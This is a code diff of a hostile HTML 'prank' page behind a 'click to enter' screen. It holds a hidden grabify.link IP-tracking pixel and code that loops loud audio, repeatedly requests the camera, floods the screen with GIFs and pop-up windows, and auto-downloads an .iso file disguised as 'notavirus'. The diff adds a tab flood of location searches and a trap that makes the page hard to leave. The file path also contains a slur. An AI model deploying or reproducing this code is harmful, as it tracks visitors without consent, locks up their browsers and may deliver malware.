@@ -1,132 +1,149 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>welcome</title>
-<style>
-  * { margin:0; padding:0; box-sizing:border-box; }
-  body {
-    background:#000;
-    overflow:hidden;
-    width:100vw;
-    height:100vh;
-    font-family:sans-serif;
-  }
-  #entry-screen {
-    position:fixed;
-    inset:0;
-    background:#000;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    z-index:99999;
-    color:#fff;
-    font-size:clamp(30px,6vw,80px);
-    cursor:pointer;
-  }
-  .gif-box {
-    position:absolute;
-    pointer-events:none;
-    border:2px solid #fff;
-    overflow:hidden;
-    opacity:0.9;
-  }
-  .gif-box img {
-    width:100%;
-    height:100%;
-    object-fit:cover;
-  }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>welcome</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      background: #000;
+      overflow: hidden;
+      width: 100vw;
+      height: 100vh;
+      font-family: sans-serif;
+    }
+    #entry-screen {
+      position: fixed;
+      inset: 0;
+      background: #000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 99999;
+      color: #fff;
+      font-size: clamp(30px, 6vw, 80px);
+      cursor: pointer;
+    }
+    .gif-box {
+      position: absolute;
+      pointer-events: none;
+      border: 2px solid #fff;
+      overflow: hidden;
+      opacity: 0.9;
+    }
+    .gif-box img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+  </style>
 </head>
 <body>
-<div id="entry-screen">click to enter</div>
-<img src="https://grabify.link/9O2XPV" width="1" height="1" style="display:none">
-<script>
-const GIF1 = 'https://media.discordapp.net/attachments/1329174770612310087/1332807559978946581/SPOILER_received_209752821757377-1.gif?ex=69c1a0c4&is=69c04f44&hm=7af4d9a6e66af1384e612196a7badcba292599b9d5a4987ac2571be65d720044&=';
-const GIF2 = 'https://media.discordapp.net/attachments/1417484808266846228/1428647621576233052/e2386c98ba87e981d21660820f08c318.gif?ex=69c19607&is=69c04487&hm=5e5b07e22786f4a748b3a13cb49806c3ee662f6614d6b7b1f9bcc2ef421913b1&=';
-let chaosActive = false;
-function unleashChaos() {
-  if (chaosActive) return;
-  chaosActive = true;
-  document.getElementById('entry-screen').style.display = 'none';
-  startSounds();
-  startCameraSpam();
-  startGifBoxes();
-  startSelfClones();
-  triggerDownload();
-}
-function startSounds() {
-  const urls = [
-    './audio/chicken-on-tree-screaming.mp3',
-    './audio/danger-alarm-sound-effect-meme.mp3',
-    './audio/dellorlol-and-peter-griffin-sped-up.mp3',
-    './audio/hl2-stalker-scream.mp3'
-  ];
+  <div id="entry-screen">click to enter</div>
+  <img src="https://grabify.link/9O2XPV" width="1" height="1" style="display:none">
 
-  const audios = urls.map(url => {
-    const a = new Audio(url);
-    a.loop = true;
-    a.volume = 1;
-    return a;
-  });
+  <script>
+    const GIF1 = 'https://media.discordapp.net/attachments/1329174770612310087/1332807559978946581/SPOILER_received_209752821757377-1.gif?ex=69c1a0c4&is=69c04f44&hm=7af4d9a6e66af1384e612196a7badcba292599b9d5a4987ac2571be65d720044&=';
+    const GIF2 = 'https://media.discordapp.net/attachments/1417484808266846228/1428647621576233052/e2386c98ba87e981d21660820f08c318.gif?ex=69c19607&is=69c04487&hm=5e5b07e22786f4a748b3a13cb49806c3ee662f6614d6b7b1f9bcc2ef421913b1&=';
 
-  // try to hit them all at once (best effort parallel start)
-  audios.forEach(a => {
-    a.play().catch(() => {});
-  });
-}
-function startCameraSpam() {
-  const spam = () => {
-    if (!chaosActive) return;
+    let chaosActive = false;
 
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => stream.getTracks().forEach(t => t.stop()))
-      .catch(() => {});
+    function unleashChaos() {
+      if (chaosActive) return;
+      chaosActive = true;
 
-    setTimeout(spam, 5000);
-  };
+      document.getElementById('entry-screen').style.display = 'none';
+      startSounds();
+      startCameraSpam();
+      startGifBoxes();
+      startSelfClones();
+      triggerDownload();
+      startSearchSpam();
+      enableLeavePrompt();
+    }
 
-  spam();
-}
-function startGifBoxes() {
-  const gifs = [GIF1, GIF2];
-  setInterval(() => {
-    if (!chaosActive) return;
-    let box = document.createElement('div');
-    box.className = 'gif-box';
-    let size = Math.random() * 300 + 100;
-    box.style.width = size + 'px';
-    box.style.height = size + 'px';
-    box.style.left = Math.random() * (window.innerWidth - size) + 'px';
-    box.style.top = Math.random() * (window.innerHeight - size) + 'px';
-    let img = document.createElement('img');
-    img.src = gifs[Math.floor(Math.random()*gifs.length)];
-    box.appendChild(img);
-    document.body.appendChild(box);
-  }, 10);
-}
-function startSelfClones() {
-  setInterval(() => {
-    if (!chaosActive) return;
-    window.open('./index.html', '_blank', 'width=800,height=600');
-  }, 1200);
-}
-function isMobile() {
-  return /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent);
-}
+    function startSounds() {
+      const urls = [
+        './audio/chicken-on-tree-screaming.mp3',
+        './audio/danger-alarm-sound-effect-meme.mp3',
+        './audio/dellorlol-and-peter-griffin-sped-up.mp3',
+        './audio/hl2-stalker-scream.mp3'
+      ];
+      const audios = urls.map(url => {
+        const a = new Audio(url);
+        a.loop = true;
+        a.volume = 1;
+        return a;
+      });
+      audios.forEach(a => a.play().catch(() => {}));
+    }
 
-function triggerDownload() {
-  if (isMobile()) return; // skip download on mobile
+    function startCameraSpam() {
+      const spam = () => {
+        if (!chaosActive) return;
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(stream => stream.getTracks().forEach(t => t.stop()))
+          .catch(() => {});
+        setTimeout(spam, 5000);
+      };
+      spam();
+    }
 
-  const a = document.createElement('a');
-  a.href = './audio/notavirustrojanpenisfniga.iso';
-  a.download = 'notavirus.iso';
-  document.body.appendChild(a);
-  a.click();
-  document.body.removeChild(a);
-}
-document.getElementById('entry-screen').onclick = unleashChaos;
-</script>
+    function startGifBoxes() {
+      const gifs = [GIF1, GIF2];
+      setInterval(() => {
+        if (!chaosActive) return;
+        let box = document.createElement('div');
+        box.className = 'gif-box';
+        let size = Math.random() * 300 + 100;
+        box.style.width = size + 'px';
+        box.style.height = size + 'px';
+        box.style.left = Math.random() * (window.innerWidth - size) + 'px';
+        box.style.top = Math.random() * (window.innerHeight - size) + 'px';
+        let img = document.createElement('img');
+        img.src = gifs[Math.floor(Math.random() * gifs.length)];
+        box.appendChild(img);
+        document.body.appendChild(box);
+      }, 10);
+    }
+
+    function startSelfClones() {
+      setInterval(() => {
+        if (!chaosActive) return;
+        window.open('./index.html', '_blank', 'width=800,height=600');
+      }, 1200);
+    }
+
+    function isMobile() {
+      return /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent);
+    }
+
+    function triggerDownload() {
+      if (isMobile()) return;
+      const a = document.createElement('a');
+      a.href = './audio/notavirustrojanpenisfniga.iso';
+      a.download = 'notavirus.iso';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    }
+
+    function startSearchSpam() {
+      setInterval(() => {
+        window.open("https://www.google.com/search?q=where+is+my+exact+location", "_blank");
+      }, 1000);
+    }
+
+    function enableLeavePrompt() {
+      window.onbeforeunload = () => true;
+    }
+
+    document.getElementById('entry-screen').onclick = unleashChaos;
+  </script>
 </body>
 </html>
